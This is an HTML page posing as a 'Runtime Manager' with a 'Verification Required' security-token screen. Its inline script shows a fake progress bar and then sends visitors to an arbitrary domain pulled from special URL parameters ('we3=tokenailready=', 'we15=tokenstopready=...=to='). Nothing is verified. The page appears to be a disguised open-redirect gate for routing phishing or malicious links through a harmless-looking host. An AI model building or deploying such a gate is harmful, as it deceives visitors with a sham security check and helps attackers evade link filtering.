<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Runtime Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Mona+Sans:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #ff7b29;
            --bg: #0d1117;
            --text: #f0f0f0;
            --border: #30363d;
            --highlight: rgba(255, 123, 41, 0.1);
        }
        
        body {
            font-family: 'Mona Sans', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            letter-spacing: -0.01em;
            line-height: 1.5;
        }
        
        .runtime-message {
            font-size: 1.8rem;
            font-weight: 600;
            text-align: center;
            padding: 30px;
            border-radius: 12px;
            background-color: rgba(13, 17, 23, 0.8);
            border: 1px solid var(--border);
            box-shadow: 0 8px 24px rgba(1, 4, 9, 0.5);
            color: var(--primary);
        }
        
        .challenge-container {
            display: none;
            width: 100%;
            max-width: 480px;
            text-align: center;
            animation: fadeIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }
        
        .challenge-box {
            background: var(--bg);
            border-radius: 12px;
            padding: 32px;
            box-shadow: 0 8px 32px rgba(1, 4, 9, 0.6);
            border: 1px solid var(--border);
        }
        
        .loading-bar {
            height: 4px;
            background: rgba(255, 123, 41, 0.2);
            border-radius: 4px;
            margin: 28px 0;
            overflow: hidden;
        }
        
        .loading-progress {
            height: 100%;
            width: 0;
            background: linear-gradient(90deg, #ff7b29, #ffa01c);
            border-radius: 4px;
            transition: width 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        
        .cursor {
            display: inline-block;
            width: 8px;
            height: 1.2em;
            background: var(--primary);
            vertical-align: middle;
            margin-left: 4px;
            animation: pulse 1s infinite;
        }
        
        .challenge-title {
            font-size: 1.4rem;
            font-weight: 600;
            margin-bottom: 24px;
            color: var(--primary);
            letter-spacing: -0.015em;
        }
        
        .status-text {
            font-size: 1rem;
            color: rgba(240, 240, 240, 0.8);
            margin-top: 16px;
        }
        
        .ascii-art {
            color: var(--primary);
            font-family: monospace;
            line-height: 1.3;
            margin: 20px 0;
            white-space: pre;
            font-size: 0.7rem;
        }
    </style>
</head>
<body>
    <div class="runtime-message" id="runtimeMessage">
        djmanager 45 runtime<span class="cursor"></span>
    </div>
    
    <div class="challenge-container" id="challengeContainer">
        <div class="challenge-box">
            <div class="challenge-title">Verification Required</div>
            <div class="ascii-art">
  _____ _     _        _   _              
 / ____| |   (_)      | | | |             
| (___ | |__  _ ___   | |_| | __ _ _ __   
 \___ \| '_ \| / __|  |  _  |/ _` | '_ \  
 ____) | | | | \__ \  | | | | (_| | | | | 
|_____/|_| |_|_|___/  |_| |_|\__,_|_| |_|
            </div>
            <div class="loading-bar">
                <div class="loading-progress" id="loadingProgress"></div>
            </div>
            <div class="status-text">Validating security token...</div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const url = window.location.href;
            const runtimeMessage = document.getElementById('runtimeMessage');
            const challengeContainer = document.getElementById('challengeContainer');
            const loadingProgress = document.getElementById('loadingProgress');
            
            // Check for challenge patterns in URL
            if (url.includes('we3=tokenailready=') || url.includes('we15=tokenstopready=')) {
                runtimeMessage.style.display = 'none';
                challengeContainer.style.display = 'block';
                
                // Simulate verification process
                let progress = 0;
                const loadingInterval = setInterval(() => {
                    progress += Math.random() * 25;
                    if (progress >= 100) {
                        progress = 100;
                        clearInterval(loadingInterval);
                        
                        // Process redirect after verification
                        setTimeout(() => {
                            if (url.includes('we15=tokenstopready=')) {
                                const parts = url.split('we15=tokenstopready=')[1].split(/[?#]/)[0];
                                if (parts.includes('=to=')) {
                                    const [_, toDomain] = parts.split('=to=');
                                    if (toDomain) {
                                        window.location.href = 'https://' + toDomain;
                                    }
                                }
                            } else {
                                const domain = url.includes('we3=tokenailready=') 
                                    ? url.split('we3=tokenailready=')[1].split(/[?#]/)[0] 
                                    : 'example.com';
                                window.location.href = 'https://' + domain;
                            }
                        }, 600);
                    }
                    loadingProgress.style.width = `${progress}%`;
                }, 180);
            }
        });
    </script>
</body>
</html>
